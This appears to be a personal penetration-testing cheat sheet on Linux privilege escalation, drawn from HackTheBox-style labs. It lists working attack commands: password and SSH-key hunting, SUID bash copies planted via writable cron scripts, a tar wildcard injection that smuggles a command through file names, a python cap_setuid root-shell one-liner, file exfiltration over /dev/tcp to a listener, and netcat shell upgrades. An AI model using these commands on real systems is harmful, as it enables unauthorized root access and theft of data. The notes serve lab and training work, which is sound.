---
title: Linux Privilege Escalation
draft: false
tags:
  - linux
  - privilege-escalation
  - cron
  - suid
---
## Plot

Let's say you have successfully compromised the system with lower user privilege. You would have to escalate your privilege into root. 

More elaborate steps could be found on [PayloadsAllTheThings]([PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md). 

Here, I uploaded check list and personal tricks.


## Checklist

- [ ] Kernel Exploit?
- [ ] User Enumeration?
- [ ] Internally opened ports?
- [ ] Pivoting?
- [ ] User File Enumeration?
- [ ] sudo -l ?
- [ ] cron jobs?
- [ ] SUID, GUID?
- [ ] MySQL?
- [ ] Automated Tools?


  
  

## Basic Enumeration

### Kernel Version

Search for Kernel Exploit online. 

```bash
cat /etc/isssue
cat /etc/*release
cat /etc/os-release

uname -a
uname -r
```


### User Enumeration

Spend some time understanding users on the system.

```bash
id
whoami
groups root

cat /etc/passwd
cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep -v /nologin

groups
last
lastlog
```

It is also a good trick to check on this files:

```bash
.bash_history
env
history
```
### Network Enumeration

Check for internally open ports and check if there's extra network interface that connects to different network. 

```bash
ifconfig
ip a s

cat /etc/networks
cat /etc/hostname
cat /etc/resolv.conf
cat /etc/hosts

ip route
arp --a
nestat -ano
netstat -ntlp
ss -ltnp
```


If port 80 is open, check if there are any different sites running internally:

```bash
/etc/apache2/sites-enabled
/var/www/html
```


### File Enumeration

```bash
# Files owned by the user
find / -uid 1001 -type f -ls 2>/dev/null | grep -v "/proc*"
# Files with the name of the user in it
find / -name "*susan*" -type f -ls 2>/dev/null
# Files with the word password in the home directory
grep -i password -R .
```


You can hunt for passwords as such:  

```bash
grep --color=auto -rnw '/' -ie "PASSWORD --color=always 2> /dev/null
locate password | more
find / -name id_rsa 2> /dev/null
```

Search on files that are editable by everyone:
  

```bash
find / -not -type l -perm -o+w
```

Search for files that specific user owns:

```bash
find / -user jadu 2>/dev/null
find / -user jadu 2>/dev/null | grep -Ev '(/proc/|/sys/)'
```

Check on **/tmp** and **/opt** folder for unusual files:

![](https://i.imgur.com/fFqh5IE.png)



## Privileges

  Check for files with sudo right:

```
sudo -S -l
sudo -l
```


## Cron Jobs

Check for Cron Jobs:
  
```bash
ps aux
top
crontab -l
ls -al /etc/cron*
cat /etc/crontab
```

### Pspy

**Pspy** helps you see what is happening in system even if you are not root:

![](https://i.imgur.com/1NkGZYQ.png)


### Escalation via Cron Paths

**overwrite.sh** is being ran as cronjob:


![](https://i.imgur.com/A8yTRGn.png)

The $PATH is used to set the default path where the cron jobs would run from. Unless specified otherwise.

In our case, the cron jobs $PATH has been set to the user’s home directory. Meaning the default path for cron jobs to run will be the _user_’s home directory:

![](https://i.imgur.com/Q4K7R0o.png)

However, there is no overwirte.sh at /home/user.

Since administrator hasn't created overwrite.sh on /home/user yet, I can create my own **overwrite.sh**:

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`

With the command below, now I have escalated shell:

`/tmp/bash -p`

### Escalation via Cron Wildcards

**/usr/local/bin/compress.sh** was being ran on cronjobs:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

  
I first created **runme.sh** that contains script for escalated bash:

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh`

Now I give it execute permission

`chmod +x runme.sh`

I set the checkpoint:

`touch /home/user/--checkpoint=1`

Checkpoint will execute runme.sh when cron runs:

`touch /home/user/--checkpoint-action=exec=sh\runme.sh`

Running below command, I get shell as root:

`/tmp/bash -p`

  

### Escalation via Cron File Overwrites

This is the most common way.

On [HTB-Cronos](https://jadu101.github.io/Hackthebox%F0%9F%93%A6/HTB-Cronos), Linpeas showed that **laravevl/artisan** is on cron jobs:

![](https://i.imgur.com/TKo5zvv.png)

www-data is the owner of this file and it has write permission on it:

![](https://i.imgur.com/p8HJvBU.png)

With Pentest-Monkey PHP script, I can replace **artisan** file and get a reverse shell connection as root:

![](https://i.imgur.com/WQzjJDB.png)


  
  

## SUID

Search on [GTFOBins](https://gtfobins.github.io/).

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

### SUID Path

#### Ex) Tar
I can take a better look at it using **ltrace**:

`ltrace /usr/bin/pandora_backup`

![](https://i.imgur.com/03y8EG6.png)

Because there’s no path given for tar, it will use the current user’s PATH environment variable to look for valid executables to run. But I can control that path, which makes this likely vulnerable to path hijack.

I’ll work from `/dev/shm`, and add that to the current user’s PATH:

![](https://i.imgur.com/dCc3h78.png)

Now the first place it will look for **tar** is `/dev/shm`.

I will create a simple payload that will run bash as root inside tar as such:

![](https://i.imgur.com/AIpHMhO.png)


Running **pandora_backup** will spawn a shell as root:

![](https://i.imgur.com/l0W0Cr0.png)



## Capabilities

- https://linux-audit.com/linux-capabilities-101/
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/HTB-Lightweight

Find out what capabilities are Enabled: `getcap -r / 2>/dev/null`

![](https://i.imgur.com/SlwkawP.png)

A classic example…

Let’s say tar has “tar = cap_dac_read_search+ep” which means tar has read access to anything. We can abuse this to read /etc/shadow by utilising the function of archiving a file.


### Capabilites - python


Running **linpeas.sh** discovers **capabilites** on **python3.8**:


![](https://i.imgur.com/vL4vE6P.png)

**cap_setuid** has the following ability according to the man page:

> * Make arbitrary manipulations of process UIDs (setuid(2), setreuid(2), setresuid(2), setfsuid(2)); * forge UID when passing socket credentials via UNIX domain sockets; * write a user ID mapping in a user namespace (see user_namespaces(7)).


I can abuse this capability following guide from [GTFOBins](https://gtfobins.github.io/gtfobins/python/): 

![](https://i.imgur.com/LlCkMFT.png)


Running the command from above, It instantly give me shell as the root:

`/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

![](https://i.imgur.com/GgiF1oF.png)

## Automated Tools

  

**LinPeas** - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

  
**LinEnum** - https://github.com/rebootuser/LinEnum



**Linux Exploit Suggester** - https://github.com/mzet-/linux-exploit-suggester

  

**Linux Priv Checker** - https://github.com/sleventyeleven/linuxprivchecker
  

## File Transfer
### scp

`scp 10.10.14.17@lightweight.htb:/tmp/listen.pcap .`
  
![](https://i.imgur.com/QBsXWN3.png)


### nc

With **netcat** listener running locally on Kali machine, I sent the contents of **backup.7z** file over the network to the listener running on the local machine:

`cat backup.7z > /dev/tcp/10.10.14.17/9001`

![](https://i.imgur.com/BWu6t6d.png)

Now on my local listener, the data receieved by Netcat is redirected to a file named backup.7z:

`nc -lvnp 9001 > backup.7z`

![](https://i.imgur.com/FtwfYyu.png)

## TTY

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:

```shell-session
[!bash!]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

```shell-session
www-data@remotehost$ ^Z

[1] Stopped                 nc -lvnp 1234
[!bash!]$ stty raw -echo
[!bash!]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```shell-session
[!bash!]$ echo $TERM

xterm-256color
```

```shell-session
[!bash!]$ stty size

67 318
```

The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:

```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.




## Developing your shell
  
- Script

```bash
script /dev/null -c bash
```

- Python pty module:
  
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```


- Push the shell to background:

```
Ctrl + z
```


- Examine current terminal and STTY info:

```bash
echo $TERM
stty -a
```

- Set current STTY

```bash
stty raw -echo
```


- Foreground:

```bash
fg
```


- Reinitialize:

```bash
reset
```

- Setup shell according to the local machine setting:

```bash
$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
```

  
  
  

